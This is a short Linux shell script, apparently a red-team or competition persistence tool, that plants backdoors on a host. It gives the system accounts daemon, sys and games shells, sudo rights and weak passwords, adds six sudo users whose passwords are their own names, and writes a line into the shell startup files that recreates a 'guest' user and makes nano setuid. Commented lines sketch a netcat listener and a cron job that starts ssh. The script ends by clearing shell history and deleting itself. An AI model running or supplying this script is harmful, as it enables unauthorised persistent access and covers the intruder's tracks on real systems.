#add users and sudo
usermod --shell /bin/bash daemon
usermod --shell /bin/bash sys
usermod --shell /bin/bash games
usermod -aG sudo daemon
usermod -aG sudo sys
usermod -aG sudo games

echo 'daemon:password1' | chpasswd
echo 'sys:password1' | chpasswd
echo 'games:password1' | chpasswd

useradd joe 
echo 'joe:joe' | chpasswd
usermod -aG sudo joe

useradd matthew
echo 'matthew:matthew' | chpasswd
usermod -aG sudo matthew

useradd ben
echo 'ben:ben' | chpasswd
usermod -aG sudo ben

useradd silas 
echo 'silas:silas' | chpasswd
usermod -aG sudo silas

useradd stubblefield
echo 'stubblefield:stubblefield' | chpasswd
usermod -aG sudo stubblefield

useradd cyberparrot
echo 'cyberparrot:cyberparrot' | chpasswd
usermod -aG sudo cyberparrot


#start bash persistence with guest user
sudo echo "useradd guest && echo 'guest:guest' | chpasswd && chmod u+s /bin/nano" >> ~/.bash_profile
sudo echo "useradd guest && echo 'guest:guest' | chpasswd && chmod u+s /bin/nano" >> ~/.bashrc


#netcat
##ncat --tcp -lvp 23


#crontab ?????
#crontab -l | { cat; echo "*/1 * * * * sudo /etc/init.d/ssh start"; } | crontab -

#hide crontab ???

#kill history
history -c

#kill self
rm -rf linux.sh
